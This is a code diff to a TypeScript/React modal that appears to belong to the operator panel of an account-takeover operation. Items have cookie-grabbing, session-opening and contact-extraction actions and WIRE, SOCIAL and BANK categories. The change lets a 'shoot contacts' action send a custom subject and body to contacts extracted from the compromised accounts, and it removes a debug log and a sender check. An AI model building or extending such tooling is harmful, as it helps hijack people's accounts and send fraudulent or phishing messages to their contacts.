@@ -28,7 +28,19 @@ interface ItemDetailsModalProps {
   onVerify: (id: string) => void;
   onGetCookie: (id: string) => void;
   onExtract: (id: string) => void;
-  onShootContacts?: (id: string) => void;
+  onShootContacts?: (data: {
+    id: string;
+    selectedContacts: Array<{
+      name?: string;
+      email?: string;
+      phone?: string | number;
+      company?: string;
+      platform?: string;
+      username?: string;
+    }>;
+    subject: string;
+    body: string;
+  }) => void;
   onOpenSession?: (browserId: string) => void;
   onMemoSave: (id: string, text: string) => void;
   loading?: boolean;
@@ -129,24 +141,13 @@ export const ItemDetailsModal = ({
 
   // Check if shoot contacts should be available
   const hasExtract = data[`${category.toLowerCase()}Extract`];
-  console.log('ItemDetailsModal Debug:', {
-    category,
-    fullAccess: data?.fullAccess,
-    verifyAccess: data?.verifyAccess,
-    cookieAccess: data?.cookieAccess,
-    hasExtract,
-    wireSenderJSON: data?.wireSenderJSON,
-    socialSenderJSON: data?.socialSenderJSON,
-  });
-  
   const canShootContacts = data?.fullAccess === 'TRUE' && 
     data?.verifyAccess === 'TRUE' && 
     data?.cookieAccess === 'TRUE' && 
-    ((category === 'WIRE' && data?.wireSenderJSON) || 
-     (category === 'SOCIAL' && data?.socialSenderJSON)) && 
     hasExtract && 
     onShootContacts && 
-    category !== null;
+    category !== null && 
+    category !== 'BANK';
 
   const handleMemoClick = () => {
     setMemoText(data.memo || '');
@@ -395,7 +396,7 @@ export const ItemDetailsModal = ({
           onClose={() => setShowShootContactsModal(false)}
           onSubmit={async (submitData) => {
             if (onShootContacts) {
-              await onShootContacts(submitData.id);
+              await onShootContacts(submitData);
             }
             setShowShootContactsModal(false);
           }}
